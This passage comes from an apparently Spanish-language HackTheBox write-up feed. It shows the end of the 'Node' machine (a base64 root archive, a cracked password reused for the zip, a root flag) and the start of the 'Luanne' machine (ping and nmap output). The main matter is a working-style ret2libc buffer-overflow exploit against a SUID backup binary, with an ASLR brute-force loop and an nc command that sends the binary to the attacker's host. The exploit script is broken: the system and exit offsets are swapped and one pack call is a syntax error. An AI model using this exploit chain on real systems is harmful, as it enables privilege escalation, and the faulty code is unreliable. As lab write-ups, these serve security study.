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
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos devuelve un resultado en base64, y si lo decodeamos obtenemos un archivo comprimido, y al unzipearlo nos pide ingresar una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
Archive:  file
[file] root/.profile password: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos usar la que previamente obtuvimos con &lt;code&gt;fcrackzip&lt;/code&gt; ya que se puede estar reutilizando la contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip file
Archive:  file
[file] root/.profile password: 
  inflating: root/.profile           
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
 extracting: root/.nano/search_history  
❯ 
❯ ls
 root   file
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Efectivamente logramos descomprimirlo usando la contraseña previa &lt;code&gt;magicword&lt;/code&gt;, ahora podemos ver lo que hay dentro del directorio y encontramos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cd root
❯ ls
 root.txt
❯ cat root.txt
98ef491742abffa14a62facb8d832818
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA  &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vimos anteriormente que pudimos leer la flag &lt;code&gt;root.txt&lt;/code&gt;, pero no logramos obtener acceso como el usuario &lt;code&gt;root&lt;/code&gt; al sistema. Anteriormente vimos que al binario &lt;code&gt;backup&lt;/code&gt;, le pasabamos un parametro final correspondiente a un directorio, pero si tratamos de pasar muchos caracteres como ultimo parametro hacemos que el programa se corrompa.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')   
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python -c 'print(&quot;A&quot;*40000)')
Segmentation fault (core dumped)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que se acontece un desbordamiento de buffer o &lt;code&gt;bufferoverflow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a traernos el binario a nuestro equipo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ nc 10.10.16.2 443 &amp;lt; backup
nc 10.10.16.2 443 &amp;lt; backup
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ejecutarlo sin problemas, voy a crearme un directorio y el archivo donde se almacenan las keys.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir /etc/myplace
❯ nvim /etc/myplace/keys
❯ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder ver los registros al ejecutar el binario a bajo nivel usare &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  r a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python3 -c 'print(&quot;A&quot;*3000)')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se acontece el desbordamiento sobrescribiendo los registros y que alteran el flujo del programa, esto termina corrompiendolo cuando introducimos muchos caracteres capaces de sobrepasar el tamaño del buffer asignado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/buff.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si quieres saber mas acerca de esto te dejo el siguiente articulo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://keepcoding.io/blog/que-es-un-buffer-overflow/&quot;&gt;https://keepcoding.io/blog/que-es-un-buffer-overflow/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Lo que podriamos hacer es que el flujo del programa podemos meterlo en la pila, donde a traves de un shellcode podemos ejecutar comandos y otorgarnos una reverse shell.&lt;/p&gt;

&lt;p&gt;Pero si vemos las protecciones del binario este cuenta con  &lt;code&gt;data execution prevention&lt;/code&gt;. &lt;code&gt;NX&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  checksec
[+] checksec for '/home/fmiracle/Machines/Node/content/backup'
[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi que necesitamos buscar otra forma de explotar del binario. Podemos usar un &lt;code&gt;ret2libc&lt;/code&gt; que lo que hace es aprovecharse la la libreria &lt;code&gt;libc&lt;/code&gt; que el binario esta utilizando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;tom@node:/usr/local/bin$ which backup | xargs ldd
which backup | xargs ldd
	linux-gate.so.1 =&amp;gt;  (0xf7723000)
	libc.so.6 =&amp;gt; /lib32/libc.so.6 (0xf7564000)
	/lib/ld-linux.so.2 (0xf7724000)
tom@node:/usr/local/bin$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con ello en vez de mandar el flujo del programa a la pila, podemos usar el &lt;code&gt;libc&lt;/code&gt; para ejecutar una llamada a nivel de sistema.&lt;/p&gt;

&lt;p&gt;Para ello necesitamos primero saber si la maquina cuenta con &lt;code&gt;ÀSLR&lt;/code&gt; &lt;code&gt;aleatorizacion de direcciones de la memoria&lt;/code&gt;, ello podemos verificarlo leyendo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat /proc/sys/kernel/randomize_va_space
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al tener un valor de 2, quiere decir que la maquina si cuenta con &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Otra forma de verlo seria usando la siguente expresión, donde podemos ver que efectivamente cuenta con &lt;code&gt;ASLR&lt;/code&gt; al cambiar las direcciones.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 10); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done
&amp;lt;ch backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()'; done  
0xf7553000
0xf752d000
0xf75a7000
0xf75bc000
0xf7579000
0xf7618000
0xf75ff000
0xf7613000
0xf7601000
0xf7556000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero pese a que exista &lt;code&gt;ASLR&lt;/code&gt;, al no ser muy largas pueden repetirse, por tanto aunque sean aleatorios pueden volver a repetirse al haber una colision, podemos burlar el &lt;code&gt;ASLR&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;for i in $(seq 1 1000); do which backup | xargs ldd | grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
&amp;lt;grep libc | awk 'NF{print $NF}' | tr -d '()' | grep 0xf752d000; done; break 
0xf752d000
0xf752d000
0xf752d000
bash: break: only meaningful in a `for', `while', or `until' loop
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora para poder ejecutar un &lt;code&gt;ret2lib&lt;/code&gt; y poder ejecutar una llamada a nivel de sistema necesitaremos:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;La dirección de system&lt;/li&gt;
  &lt;li&gt;La dirección de exit&lt;/li&gt;
  &lt;li&gt;La dirección de la cadena &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Basicamente lo que queremos lograr es &lt;code&gt;os.system(&quot;/bin/sh&quot;)&lt;/code&gt; y al ser el binario &lt;code&gt;suid&lt;/code&gt; lo hara como &lt;code&gt;root&lt;/code&gt; y ganaremos acceso como este usuario.&lt;/p&gt;

&lt;p&gt;Para ello primero debemos de saber de las &lt;code&gt;A&lt;/code&gt; que insertamos antes cuantas debemos insertar para tener control del registro &lt;code&gt;eip&lt;/code&gt;. Para lo cual podemos usar &lt;code&gt;pattern create&lt;/code&gt; y generar un numero de cadena aleatoria.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  pattern create 1000
[+] Generating a pattern of 1000 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
[+] Saved as '$_gef0'
gef➤  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Insertamos la cadena generada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y ahora con &lt;code&gt;pattern offset&lt;/code&gt; podemos saber cual es el limite para sobreescribir &lt;code&gt;eip&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gef➤  patter offset $eip
[+] Searching for '$eip'
[+] Found at offset 512 (little-endian search) likely
[+] Found at offset 320 (big-endian search)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que necesitamos &lt;code&gt;512&lt;/code&gt; caracteres antes de sobrescribir &lt;code&gt;eip&lt;/code&gt;. Verificamos con la ayuda de python imprimiendo &lt;code&gt;512 A&lt;/code&gt; y adicionamos &lt;code&gt;4 B&lt;/code&gt;, que como resultado ahora el registro &lt;code&gt;eip&lt;/code&gt; valdria &lt;code&gt;BBBB&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Node/node11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que sabemos el offset lo siguiente sera encontrar las direcciones de system, exit y sh. Y para ello primero vamos a coger una dirección base de libc, puede ser cualquiera &lt;code&gt;0xf752d000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Teniendo esto podemos ir armandonos un script en python. Donde primero especificamos el offset de caracteres, debemos encontrar primero los offsets de las direcciones de &lt;code&gt;system, exit y binsh&lt;/code&gt;. Ya que una vez tengamos estos podamos obtener las direcciones reales de estas usando la &lt;code&gt;libc_base + los offsets&lt;/code&gt; de cada una.&lt;/p&gt;

&lt;p&gt;Y usamos pack para representar las direcciones en &lt;code&gt;litelediam&lt;/code&gt; y evitar darle la vuelta a las direcciones.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3


from struct import pack

offset = 512

junk = &quot;A&quot;*offset

#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 

exit_add_offset = 

binsh_add_offset = 


system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )

exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)

binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente como payload deberiamos pasarle el junk sumado mas las direcciones reales de system, exit y binsh.&lt;/p&gt;

&lt;p&gt;Ahora para conseguir los offset, primero usaremos &lt;code&gt;readelf&lt;/code&gt; para las direcciones de &lt;code&gt;system y exit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;readelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;
&amp;lt;adelf -s /lib32/libc.so.6 | grep -E &quot; system@@| exit@@&quot;                     
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y para obtener el offset de binsh, podemos usar &lt;code&gt;strings&lt;/code&gt; con los siguientes parametros:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;strings -a -t x /lib32/libc.so.6 | grep &quot;/bin/sh&quot;
 15900b /bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora solo debemos correr el programa multiples veces, para causar una colision en las direcciones hasta que &lt;code&gt;libc&lt;/code&gt; valga lo que ejecutamos en el script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3


from struct import pack

offset = 512

junk = &quot;A&quot;*offset

#ret2lib - EIP  -&amp;gt; system -&amp;gt; exit -&amp;gt; /bin/sh

libc_base_add = 0xf752d000

system_add_offset = 0x0002e7b0

exit_add_offset = 0x0003a940

binsh_add_offset = 0x0015900b

system_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + system_add_offset )

exit_add_real = pack(&quot;&amp;lt;I&quot;, libc_base_add + exit_add_offset)

binsh_add_real = pack(&quot;&amp;lt;I&quot;), libc_base_add + binsh_add_offset)


payload = junk + system_add_real + exit_add_real + binsh_add_real

print(payload)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit multiples veces y se ejecuta la &lt;code&gt;/bin/sh&lt;/code&gt; y ganamos acceso como el usuario &lt;code&gt;root&lt;/code&gt;, ahora solo debemos dirigirnos al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;while true; do backup a 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(python exploit.py); done
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# whoami
root
#cd /root
cat root.txt
98ef491742abffa14a62facb8d832818
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Mon, 17 Jul 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Node</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Node</guid>
        
        <category>Information Leaked</category>
        
        <category>Api Enumeration</category>
        
        <category>Cracking Hashes</category>
        
        <category>MongoDB Enumeration</category>
        
        <category>MongoTask Injection</category>
        
        <category>SUID Binary Explotation</category>
        
        <category>Buffer Overflow</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Luanne - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Luanne&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, para poder comprometer la maquina nos aprovecharemos de una ruta expuesta con una api en &lt;code&gt;JSON&lt;/code&gt; donde con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; aprovecharemos el uso de parametros para causar una inyección en &lt;code&gt;lua&lt;/code&gt; con la que ganaremos acceso a la maquina, despues aprovecharemos de un parametro de un servicio de &lt;code&gt;httpd&lt;/code&gt; que corre en &lt;code&gt;NETBSD&lt;/code&gt; obteniendo una clave publica con la que ganaremos acceso como un usario con mayores privilegios y finalmente en un comprimido que lograremos desencriptar obtendremos la contraseña del usuario &lt;code&gt;root&lt;/code&gt; y habremos comprometido el sistema.&lt;/p&gt;

&lt;p&gt;Esta maquina es divertida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Luanne
❯ ls
 Luanne
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.218
PING 10.10.10.218 (10.10.10.218) 56(84) bytes of data.
64 bytes from 10.10.10.218: icmp_seq=1 ttl=254 time=123 ms

--- 10.10.10.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 122.913/122.913/122.913/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;254&lt;/code&gt; y contando el salto al ser &lt;code&gt;255&lt;/code&gt;, podemos usar siguiente pagina para saber a que posiblemente nos estamos enfrentando, que en este caso podria corresponder a un &lt;code&gt;NetBSD&lt;/code&gt;. Mas adelante cuando comprometamos la maquina validaremos si es correcto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://subinsb.com/default-device-ttl-values/&quot;&gt;https://subinsb.com/default-device-ttl-values/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.218 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 16:31 GMT
Initiating SYN Stealth Scan at 16:31
Scanning 10.10.10.218 [65535 ports]
Discovered open port 80/tcp on 10.10.10.218
Discovered open port 22/tcp on 10.10.10.218
Discovered open port 9001/tcp on 10.10.10.218
Completed SYN Stealth Scan at 16:32, 26.67s elapsed (65535 total ports)
Nmap scan report for 10.10.10.218
Host is up, received user-set (0.28s latency).
Scanned at 2023-06-29 16:31:40 GMT for 27s
Not shown: 62926 filtered tcp ports (no-response), 2606 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
           Raw packets sent: 129915 (5.716MB) | Rcvd: 2611 (104.460KB)
&lt;/code&gt;&lt;/pre&gt;

